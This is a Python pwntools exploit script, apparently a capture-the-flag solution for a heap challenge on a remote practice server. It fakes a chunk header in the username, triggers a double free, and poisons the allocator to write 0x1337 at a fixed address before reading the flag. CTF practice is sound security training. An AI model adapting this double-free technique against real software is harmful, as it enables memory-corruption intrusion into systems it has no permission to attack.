#!/bin/python3

from pwn import *

elf = ELF("./task")

username = b'a'*16 + b'\x00'*8 + b'\x21' + b'\x00'*7
payload1 = p64(0x2040f0)
payload2 = p64(0x1337)
dummyData = b'b'*8
n = b'8'

def do_malloc(size, data):
	p.recvuntil(b'> ')
	p.sendline(b'1')
	p.recvuntil(b'Size: ')
	p.sendline(size)
	p.recvuntil(b'Data: ')
	p.sendline(data)

def do_free(i):
	p.recvuntil(b'> ')
	p.sendline(b'2')
	p.recvuntil(b'Index: ')
	p.sendline(i)

p = remote('rivit.dev', 10014)

p.recvuntil(b'Username: ')
p.sendline(username)
# malloc 0
print("[*] malloc 0")
do_malloc(n, dummyData)
# malloc 1
print("[*] malloc 1")
do_malloc(n, dummyData)
print("[*] freeing 0")
do_free(b'0')
print("[*] freeing 1")
do_free(b'1')
# VULNERABILITY
print("[*] freeing 0")
do_free(b'0')
# malloc 2 PAYLOAD 1
print("[*] malloc 2")
do_malloc(n, payload1)
# malloc 3
print("[*] malloc 3")
do_malloc(n, dummyData)
# malloc 4
print("[*] malloc 4")
do_malloc(n, dummyData)
# malloc 5 PAYLOAD 2
print("[*] malloc 5")
do_malloc(n, payload2)

p.interactive() # Enter '3' for manual flag read
